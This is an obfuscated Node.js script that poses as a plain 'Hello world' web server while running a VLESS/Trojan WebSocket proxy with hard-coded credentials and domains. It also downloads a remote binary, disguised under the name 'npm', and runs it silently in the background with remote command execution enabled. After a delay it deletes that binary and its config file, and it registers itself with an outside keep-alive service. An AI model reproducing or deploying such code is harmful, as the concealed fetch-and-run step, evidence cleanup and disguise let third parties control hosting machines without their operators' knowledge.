const _0x1c8df7=_0x3225;(function(_0x12e51,_0x247911){const _0x797ae7=_0x3225,_0xf539b9=_0x12e51();while(!![]){try{const _0x80abe1=parseInt(_0x797ae7(0xe4))/0x1*(parseInt(_0x797ae7(0xb3))/0x2)+-parseInt(_0x797ae7(0x8c))/0x3+-parseInt(_0x797ae7(0xb0))/0x4*(parseInt(_0x797ae7(0x99))/0x5)+-parseInt(_0x797ae7(0x8e))/0x6+-parseInt(_0x797ae7(0xc2))/0x7*(-parseInt(_0x797ae7(0xba))/0x8)+-parseInt(_0x797ae7(0xb8))/0x9+parseInt(_0x797ae7(0x102))/0xa;if(_0x80abe1===_0x247911)break;else _0xf539b9['push'](_0xf539b9['shift']());}catch(_0x37d70e){_0xf539b9['push'](_0xf539b9['shift']());}}}(_0x3a48,0xc093e));const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require(_0x1c8df7(0xc5)),path=require(_0x1c8df7(0xf9)),crypto=require(_0x1c8df7(0xd9)),{Buffer}=require(_0x1c8df7(0x104)),{exec,execSync}=require(_0x1c8df7(0xb6)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1c8df7(0x9d)][_0x1c8df7(0xa8)]||_0x1c8df7(0xef),NEZHA_SERVER=process['env'][_0x1c8df7(0xbf)]||'',NEZHA_PORT=process[_0x1c8df7(0x9d)][_0x1c8df7(0xc7)]||'',NEZHA_KEY=process[_0x1c8df7(0x9d)][_0x1c8df7(0xaf)]||'',DOMAIN=process[_0x1c8df7(0x9d)]['DOMAIN']||_0x1c8df7(0xbd),AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process[_0x1c8df7(0x9d)][_0x1c8df7(0xa5)]||UUID[_0x1c8df7(0xa7)](0x0,0x8),SUB_PATH=process['env'][_0x1c8df7(0xd2)]||'sub',NAME=process[_0x1c8df7(0x9d)][_0x1c8df7(0xa3)]||'',PORT=process[_0x1c8df7(0x9d)][_0x1c8df7(0xc8)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x2b2939=_0x1c8df7;try{const _0x7a5525=await axios['get']('https://api.ip.sb/geoip'),_0x4e3617=_0x7a5525['data'];ISP=(_0x4e3617[_0x2b2939(0xcd)]+'-'+_0x4e3617[_0x2b2939(0xca)])[_0x2b2939(0xee)](/ /g,'_');}catch(_0x3850e2){ISP=_0x2b2939(0xb5);}};GetISP();const httpServer=http[_0x1c8df7(0xf7)]((_0x36b1b5,_0x50f169)=>{const _0xbfbb45=_0x1c8df7;if(_0x36b1b5[_0xbfbb45(0xf0)]==='/'){const _0x449d1e=path['join'](__dirname,_0xbfbb45(0xe6));fs[_0xbfbb45(0xea)](_0x449d1e,_0xbfbb45(0xe8),(_0xd9a0b3,_0x410985)=>{const _0x2593ac=_0xbfbb45;if(_0xd9a0b3){_0x50f169[_0x2593ac(0x95)](0xc8,{'Content-Type':_0x2593ac(0xdc)}),_0x50f169['end'](_0x2593ac(0x90));return;}_0x50f169[_0x2593ac(0x95)](0xc8,{'Content-Type':_0x2593ac(0xdc)}),_0x50f169['end'](_0x410985);});return;}else{if(_0x36b1b5['url']==='/'+SUB_PATH){const _0xe03a8e=NAME?NAME+'-'+ISP:ISP,_0x1abf2f=_0xbfbb45(0xc3)+UUID+_0xbfbb45(0xce)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0xbfbb45(0x96)+WSPATH+'#'+_0xe03a8e,_0x30c3b7=_0xbfbb45(0xd5)+UUID+_0xbfbb45(0x103)+DOMAIN+_0xbfbb45(0x9e)+DOMAIN+_0xbfbb45(0x96)+WSPATH+'#'+_0xe03a8e,_0x379773=_0x1abf2f+'\x0a'+_0x30c3b7,_0x468147=Buffer['from'](_0x379773)[_0xbfbb45(0xa9)](_0xbfbb45(0xa0));_0x50f169[_0xbfbb45(0x95)](0xc8,{'Content-Type':_0xbfbb45(0xe5)}),_0x50f169[_0xbfbb45(0xad)](_0x468147+'\x0a');}else _0x50f169[_0xbfbb45(0x95)](0x194,{'Content-Type':_0xbfbb45(0xe5)}),_0x50f169['end'](_0xbfbb45(0xe0));}}),wss=new WebSocket[(_0x1c8df7(0xb2))]({'server':httpServer}),uuid=UUID[_0x1c8df7(0xee)](/-/g,''),DNS_SERVERS=[_0x1c8df7(0xec),_0x1c8df7(0xe1)];function resolveHost(_0xa5fa6a){return new Promise((_0x5af99a,_0x9c2236)=>{const _0x102ccb=_0x3225;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x102ccb(0xdb)](_0xa5fa6a)){_0x5af99a(_0xa5fa6a);return;}let _0x39515d=0x0;function _0x5920a8(){const _0x343ac4=_0x102ccb;if(_0x39515d>=DNS_SERVERS[_0x343ac4(0xdd)]){_0x9c2236(new Error('Failed\x20to\x20resolve\x20'+_0xa5fa6a+_0x343ac4(0x9a)));return;}const _0x584666=DNS_SERVERS[_0x39515d];_0x39515d++;const _0x5ade12=_0x343ac4(0xf6)+encodeURIComponent(_0xa5fa6a)+_0x343ac4(0xf3);axios[_0x343ac4(0xe2)](_0x5ade12,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x343ac4(0xf4)](_0x477d68=>{const _0x4272bf=_0x343ac4,_0x4a0541=_0x477d68[_0x4272bf(0xfb)];if(_0x4a0541[_0x4272bf(0x92)]===0x0&&_0x4a0541[_0x4272bf(0xa1)]&&_0x4a0541[_0x4272bf(0xa1)][_0x4272bf(0xdd)]>0x0){const _0x5161ae=_0x4a0541['Answer']['find'](_0x2ec3cb=>_0x2ec3cb[_0x4272bf(0xfd)]===0x1);if(_0x5161ae){_0x5af99a(_0x5161ae[_0x4272bf(0xfb)]);return;}}_0x5920a8();})[_0x343ac4(0xae)](_0x1856e1=>{_0x5920a8();});}_0x5920a8();});}function handleVlessConnection(_0x6b95ca,_0x44a454){const _0x227aaa=_0x1c8df7,[_0x1b0d0d]=_0x44a454,_0x4dd87a=_0x44a454[_0x227aaa(0xa7)](0x1,0x11);if(!_0x4dd87a[_0x227aaa(0xc9)]((_0x5dccf1,_0x5e5c05)=>_0x5dccf1==parseInt(uuid['substr'](_0x5e5c05*0x2,0x2),0x10)))return![];let _0x6ed420=_0x44a454[_0x227aaa(0xa7)](0x11,0x12)['readUInt8']()+0x13;const _0xb18d10=_0x44a454[_0x227aaa(0xa7)](_0x6ed420,_0x6ed420+=0x2)['readUInt16BE'](0x0),_0x180e37=_0x44a454['slice'](_0x6ed420,_0x6ed420+=0x1)[_0x227aaa(0xf2)](),_0x7703fb=_0x180e37==0x1?_0x44a454[_0x227aaa(0xa7)](_0x6ed420,_0x6ed420+=0x4)[_0x227aaa(0xd0)]('.'):_0x180e37==0x2?new TextDecoder()[_0x227aaa(0xa6)](_0x44a454[_0x227aaa(0xa7)](_0x6ed420+0x1,_0x6ed420+=0x1+_0x44a454[_0x227aaa(0xa7)](_0x6ed420,_0x6ed420+0x1)[_0x227aaa(0xf2)]())):_0x180e37==0x3?_0x44a454[_0x227aaa(0xa7)](_0x6ed420,_0x6ed420+=0x10)[_0x227aaa(0xab)]((_0x4c7699,_0x47df20,_0x19654b,_0x49b82f)=>_0x19654b%0x2?_0x4c7699[_0x227aaa(0xd1)](_0x49b82f['slice'](_0x19654b-0x1,_0x19654b+0x1)):_0x4c7699,[])['map'](_0x6d44f6=>_0x6d44f6['readUInt16BE'](0x0)[_0x227aaa(0xa9)](0x10))[_0x227aaa(0xd0)](':'):'';_0x6b95ca[_0x227aaa(0xff)](new Uint8Array([_0x1b0d0d,0x0]));const _0x4606f2=createWebSocketStream(_0x6b95ca);return resolveHost(_0x7703fb)['then'](_0x456c6e=>{const _0x37dc0e=_0x227aaa;net[_0x37dc0e(0xed)]({'host':_0x456c6e,'port':_0xb18d10},function(){const _0x3eba9c=_0x37dc0e;this[_0x3eba9c(0xcc)](_0x44a454['slice'](_0x6ed420)),_0x4606f2['on'](_0x3eba9c(0xde),()=>{})['pipe'](this)['on'](_0x3eba9c(0xde),()=>{})[_0x3eba9c(0xf5)](_0x4606f2);})['on'](_0x37dc0e(0xde),()=>{});})[_0x227aaa(0xae)](_0x20cccb=>{net['connect']({'host':_0x7703fb,'port':_0xb18d10},function(){const _0x320b02=_0x3225;this[_0x320b02(0xcc)](_0x44a454['slice'](_0x6ed420)),_0x4606f2['on'](_0x320b02(0xde),()=>{})['pipe'](this)['on'](_0x320b02(0xde),()=>{})['pipe'](_0x4606f2);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x4c1786,_0x48a9b2){const _0x30fe94=_0x1c8df7;try{if(_0x48a9b2[_0x30fe94(0xdd)]<0x3a)return![];const _0x432b04=_0x48a9b2[_0x30fe94(0xa7)](0x0,0x38)['toString'](),_0x394885=[UUID];let _0x48b2bf=null;for(const _0x22b213 of _0x394885){const _0x2c8882=crypto[_0x30fe94(0xaa)](_0x30fe94(0xe3))['update'](_0x22b213)[_0x30fe94(0xd4)](_0x30fe94(0xb1));if(_0x2c8882===_0x432b04){_0x48b2bf=_0x22b213;break;}}if(!_0x48b2bf)return![];let _0x4bbae7=0x38;_0x48a9b2[_0x4bbae7]===0xd&&_0x48a9b2[_0x4bbae7+0x1]===0xa&&(_0x4bbae7+=0x2);const _0x84695e=_0x48a9b2[_0x4bbae7];if(_0x84695e!==0x1)return![];_0x4bbae7+=0x1;const _0x4b2f5a=_0x48a9b2[_0x4bbae7];_0x4bbae7+=0x1;let _0x2c1a5f,_0x96489e;if(_0x4b2f5a===0x1)_0x2c1a5f=_0x48a9b2['slice'](_0x4bbae7,_0x4bbae7+0x4)[_0x30fe94(0xd0)]('.'),_0x4bbae7+=0x4;else{if(_0x4b2f5a===0x3){const _0x5596f6=_0x48a9b2[_0x4bbae7];_0x4bbae7+=0x1,_0x2c1a5f=_0x48a9b2['slice'](_0x4bbae7,_0x4bbae7+_0x5596f6)[_0x30fe94(0xa9)](),_0x4bbae7+=_0x5596f6;}else{if(_0x4b2f5a===0x4)_0x2c1a5f=_0x48a9b2['slice'](_0x4bbae7,_0x4bbae7+0x10)['reduce']((_0x50f4c4,_0x2a1abc,_0x190f34,_0x249b8a)=>_0x190f34%0x2?_0x50f4c4[_0x30fe94(0xd1)](_0x249b8a[_0x30fe94(0xa7)](_0x190f34-0x1,_0x190f34+0x1)):_0x50f4c4,[])['map'](_0x773064=>_0x773064[_0x30fe94(0x8d)](0x0)['toString'](0x10))[_0x30fe94(0xd0)](':'),_0x4bbae7+=0x10;else return![];}}_0x96489e=_0x48a9b2['readUInt16BE'](_0x4bbae7),_0x4bbae7+=0x2;_0x4bbae7<_0x48a9b2['length']&&_0x48a9b2[_0x4bbae7]===0xd&&_0x48a9b2[_0x4bbae7+0x1]===0xa&&(_0x4bbae7+=0x2);const _0x1fae26=createWebSocketStream(_0x4c1786);return resolveHost(_0x2c1a5f)[_0x30fe94(0xf4)](_0x21a523=>{const _0x77ee15=_0x30fe94;net['connect']({'host':_0x21a523,'port':_0x96489e},function(){const _0x1addab=_0x3225;_0x4bbae7<_0x48a9b2[_0x1addab(0xdd)]&&this[_0x1addab(0xcc)](_0x48a9b2[_0x1addab(0xa7)](_0x4bbae7)),_0x1fae26['on'](_0x1addab(0xde),()=>{})['pipe'](this)['on'](_0x1addab(0xde),()=>{})['pipe'](_0x1fae26);})['on'](_0x77ee15(0xde),()=>{});})[_0x30fe94(0xae)](_0x4bcb6a=>{const _0x1e8da7=_0x30fe94;net[_0x1e8da7(0xed)]({'host':_0x2c1a5f,'port':_0x96489e},function(){const _0xcf6384=_0x1e8da7;_0x4bbae7<_0x48a9b2['length']&&this[_0xcf6384(0xcc)](_0x48a9b2['slice'](_0x4bbae7)),_0x1fae26['on'](_0xcf6384(0xde),()=>{})['pipe'](this)['on']('error',()=>{})[_0xcf6384(0xf5)](_0x1fae26);})['on'](_0x1e8da7(0xde),()=>{});}),!![];}catch(_0x198572){return![];}}wss['on'](_0x1c8df7(0xfc),(_0x526bc4,_0x6018b1)=>{const _0x3677dc=_0x1c8df7,_0x53add3=_0x6018b1[_0x3677dc(0xf0)]||'';_0x526bc4[_0x3677dc(0xcb)](_0x3677dc(0xa4),_0x1f9248=>{const _0xdc97fe=_0x3677dc;if(_0x1f9248[_0xdc97fe(0xdd)]>0x11&&_0x1f9248[0x0]===0x0){const _0xa90964=_0x1f9248[_0xdc97fe(0xa7)](0x1,0x11),_0x22e71d=_0xa90964['every']((_0x8f13e0,_0x5a273e)=>_0x8f13e0==parseInt(uuid[_0xdc97fe(0x8f)](_0x5a273e*0x2,0x2),0x10));if(_0x22e71d){!handleVlessConnection(_0x526bc4,_0x1f9248)&&_0x526bc4[_0xdc97fe(0xdf)]();return;}}!handleTrojanConnection(_0x526bc4,_0x1f9248)&&_0x526bc4[_0xdc97fe(0xdf)]();})['on'](_0x3677dc(0xde),()=>{});});const getDownloadUrl=()=>{const _0x5443f2=_0x1c8df7,_0x2bb32c=os[_0x5443f2(0xeb)]();return _0x2bb32c==='arm'||_0x2bb32c==='arm64'||_0x2bb32c===_0x5443f2(0xb7)?!NEZHA_PORT?_0x5443f2(0x94):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5443f2(0xbe):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x2518ac=_0x1c8df7;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2fb3c2=getDownloadUrl(),_0x81d115=await axios({'method':_0x2518ac(0xe2),'url':_0x2fb3c2,'responseType':'stream'}),_0x21aed9=fs[_0x2518ac(0xda)](_0x2518ac(0xd8));return _0x81d115[_0x2518ac(0xfb)][_0x2518ac(0xf5)](_0x21aed9),new Promise((_0x5d7ec3,_0xcb2170)=>{const _0x46d25e=_0x2518ac;_0x21aed9['on']('finish',()=>{const _0x5a5acf=_0x3225;console[_0x5a5acf(0xd7)](_0x5a5acf(0xbc)),exec('chmod\x20+x\x20npm',_0x3f10ff=>{if(_0x3f10ff)_0xcb2170(_0x3f10ff);_0x5d7ec3();});}),_0x21aed9['on'](_0x46d25e(0xde),_0xcb2170);});}catch(_0x25f76e){throw _0x25f76e;}},runnz=async()=>{const _0xfe2ca8=_0x1c8df7;try{const _0x4a81a9=execSync(_0xfe2ca8(0x98),{'encoding':'utf-8'});if(_0x4a81a9[_0xfe2ca8(0x9b)]()!==''){console[_0xfe2ca8(0xd7)](_0xfe2ca8(0xac));return;}}catch(_0x11e42e){}await downloadFile();let _0xaa02bc='',_0x5308f8=[_0xfe2ca8(0xc0),_0xfe2ca8(0xc6),_0xfe2ca8(0x97),'2087',_0xfe2ca8(0x9f),_0xfe2ca8(0x100)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5f0437=_0x5308f8[_0xfe2ca8(0xfe)](NEZHA_PORT)?_0xfe2ca8(0xa2):'';_0xaa02bc=_0xfe2ca8(0xbb)+NEZHA_SERVER+':'+NEZHA_PORT+_0xfe2ca8(0xc1)+NEZHA_KEY+'\x20'+_0x5f0437+_0xfe2ca8(0xd6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x11aa7a=NEZHA_SERVER[_0xfe2ca8(0xfe)](':')?NEZHA_SERVER[_0xfe2ca8(0xe7)](':')[_0xfe2ca8(0x101)]():'',_0x29fc44=_0x5308f8['includes'](_0x11aa7a)?_0xfe2ca8(0xf1):_0xfe2ca8(0x9c),_0xb1b639=_0xfe2ca8(0xb4)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xfe2ca8(0xfa)+_0x29fc44+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0xfe2ca8(0xcf),_0xb1b639);}_0xaa02bc='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0xaa02bc,{'shell':'/bin/bash'},_0x3b8f77=>{const _0x467432=_0xfe2ca8;if(_0x3b8f77)console[_0x467432(0xde)]('npm\x20running\x20error:',_0x3b8f77);else console[_0x467432(0xd7)](_0x467432(0xd3));});}catch(_0x35f537){console[_0xfe2ca8(0xde)](_0xfe2ca8(0xc4)+_0x35f537);}};async function addAccessTask(){const _0x511b76=_0x1c8df7;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xbd0ffb=_0x511b76(0x93)+DOMAIN+'/'+SUB_PATH;try{const _0x223083=await axios['post'](_0x511b76(0x91),{'url':_0xbd0ffb},{'headers':{'Content-Type':'application/json'}});console[_0x511b76(0xd7)](_0x511b76(0xe9));}catch(_0x5ca82e){}}function _0x3a48(){const _0x47d31f=['message','WSPATH','decode','slice','UUID','toString','createHash','reduce','npm\x20is\x20already\x20running,\x20skip\x20running...','end','catch','NEZHA_KEY','164212nbsRiS','hex','Server','13682eIrGlU','client_secret:\x20','Unknown','child_process','aarch64','4559175KRnDqV','unlink','2952976rOCNtO','setsid\x20nohup\x20./npm\x20-s\x20','npm\x20download\x20successfully','upperson-uppersonv.hf.space','https://amd64.ssss.nyc.mn/v1','NEZHA_SERVER','443','\x20-p\x20','7uuIqgC','vless://','error:\x20','net','8443','NEZHA_PORT','PORT','every','isp','once','write','country_code','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','config.yaml','join','concat','SUB_PATH','npm\x20is\x20running','digest','trojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','log','npm','crypto','createWriteStream','test','text/html','length','error','close','Not\x20Found\x0a','1.1.1.1','get','sha224','229nlCwXh','text/plain','index.html','split','utf8','Automatic\x20Access\x20Task\x20added\x20successfully','readFile','arch','8.8.4.4','connect','replace','f089af11-462e-4d46-9aae-d173f00910ff','url','true','readUInt8','&type=A','then','pipe','https://dns.google/resolve?name=','createServer','listen','path','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','connection','type','includes','send','2053','pop','23132880DQNHvh','@cdns.doon.eu.org:443?security=tls&sni=','buffer','4199583niOelJ','readUInt16BE','6859410nUTgSZ','substr','Hello\x20world!','https://oooo.serv00.net/add-url','Status','https://','https://arm64.ssss.nyc.mn/v1','writeHead','&path=%2F','2096','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','50gMiXYm','\x20with\x20all\x20DNS\x20servers','trim','false','env','&fp=chrome&type=ws&host=','2083','base64','Answer','--tls','NAME'];_0x3a48=function(){return _0x47d31f;};return _0x3a48();}function _0x3225(_0x592356,_0x266370){_0x592356=_0x592356-0x8c;const _0x3a4805=_0x3a48();let _0x3225f4=_0x3a4805[_0x592356];return _0x3225f4;}const delFiles=()=>{const _0x55823a=_0x1c8df7;fs[_0x55823a(0xb9)]('npm',()=>{}),fs[_0x55823a(0xb9)](_0x55823a(0xcf),()=>{});};httpServer[_0x1c8df7(0xf8)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
